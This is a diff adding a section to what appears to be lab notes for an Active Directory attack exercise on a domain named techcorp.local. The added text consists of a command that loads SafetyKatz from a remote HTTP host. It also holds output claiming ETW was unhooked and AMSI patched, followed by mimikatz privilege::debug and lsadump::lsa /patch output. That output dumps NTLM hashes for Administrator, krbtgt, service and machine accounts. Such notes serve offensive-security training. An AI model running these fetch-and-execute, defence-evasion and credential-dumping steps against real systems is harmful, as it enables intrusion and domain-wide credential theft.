@@ -682,4 +682,168 @@ whoami
 techcorp\administrator
 ```
 
+Dump LSA data From techcorp.local:
 
+```
+PS C:\Users\Administrator> C:\Users\Administrator\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
+C:\Users\Administrator\Loader.exe -path http://192.168.100.17:8989/SafetyKatz.exe
+[+] Successfully unhooked ETW!
+[+] Successfully patched AMSI!
+[+] URL/PATH : http://192.168.100.17:8989/SafetyKatz.exe Arguments :
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Dec 23 2022 16:49:51
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # -path
+ERROR mimikatz_doLocal ; "-path" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz(commandline) # http://192.168.100.17:8989/SafetyKatz.exe
+ERROR mimikatz_doLocal ; "http://192.168.100.17:8989/SafetyKatz.exe" command of "standard" module not found !
+
+Module :        standard
+Full name :     Standard module
+Description :   Basic commands (does not require module name)
+
+            exit  -  Quit mimikatz
+             cls  -  Clear screen (doesn't work with redirections, like PsExec)
+          answer  -  Answer to the Ultimate Question of Life, the Universe, and Everything
+          coffee  -  Please, make me a coffee!
+           sleep  -  Sleep an amount of milliseconds
+             log  -  Log mimikatz input/output to file
+          base64  -  Switch file input/output base64
+         version  -  Display some version informations
+              cd  -  Change or display current directory
+       localtime  -  Displays system local date and time (OJ command)
+        hostname  -  Displays system local hostname
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # lsadump::lsa /patch
+Domain : TECHCORP / S-1-5-21-2781415573-3701854478-2406986946
+
+RID  : 000001f4 (500)
+User : Administrator
+LM   :
+NTLM : bc4cf9b751d196c4b6e1a2ba923ef33f
+
+RID  : 000001f5 (501)
+User : Guest
+LM   :
+NTLM :
+
+RID  : 000001f6 (502)
+User : krbtgt
+LM   :
+NTLM : 7735b8be1edda5deea6bfbacb7f2c3e7
+
+RID  : 00000450 (1104)
+User : MSOL_16fb75d0227d
+LM   :
+NTLM : c1db8cdcb7a89f56dd00b77e384c2c9c
+
+RID  : 00000464 (1124)
+User : $431000-R3GTAO0291F9
+LM   :
+NTLM :
+
+RID  : 00000465 (1125)
+User : SM_6fcd6ac55a6146a0a
+LM   :
+NTLM :
+
+RID  : 00000466 (1126)
+User : SM_154a18cd4a8e48f09
+LM   :
+NTLM :
+
+RID  : 00000467 (1127)
+User : SM_01a48ed0a28c423d9
+LM   :
+NTLM :
+
+RID  : 00000468 (1128)
+User : SM_37c4dd3af61044398
+LM   :
+NTLM :
+
+RID  : 00000469 (1129)
+User : SM_8b0a3d48bd2541249
+LM   :
+NTLM :
+
+RID  : 0000046a (1130)
+User : SM_8bf409db7e874ebe9
+LM   :
+NTLM :
+
+RID  : 0000046b (1131)
+User : SM_73d4ee9dc8674c898
+LM   :
+NTLM :
+
+RID  : 0000046c (1132)
+User : SM_eca5036b49c740608
+LM   :
+NTLM :
+
+RID  : 0000046d (1133)
+User : SM_309ad2430f0b4251b
+LM   :
+NTLM :
+
+RID  : 00000472 (1138)
+User : privuser
+LM   :
+NTLM : 6f179c10849d6a997cbe8a618868c108
+
+RID  : 00000474 (1140)
+User : testuser
+LM   :
+NTLM : e774a7974dc0de4c0019c28e4c55f8c8
+
+RID  : 000003e8 (1000)
+User : TECHCORP-DC$
+LM   :
+NTLM : bf873f681eac2a97ec7e625c47dbb9db
+
+RID  : 00000473 (1139)
+User : EMPTEST$
+LM   :
+NTLM : 653af537f77a28855ab9160dfe673b9f
+
+RID  : 0000044f (1103)
+User : US$
+LM   :
+NTLM : 7e3d15d82449d2a1cc2cef256835285d
+
+RID  : 00000470 (1136)
+User : USVENDOR$
+LM   :
+NTLM : c1929ef375eac9bb7071cc40db98b491
+
+RID  : 00000471 (1137)
+User : BASTION$
+LM   :
+NTLM : f186a027c59972382ebb051ff49decd4
+```
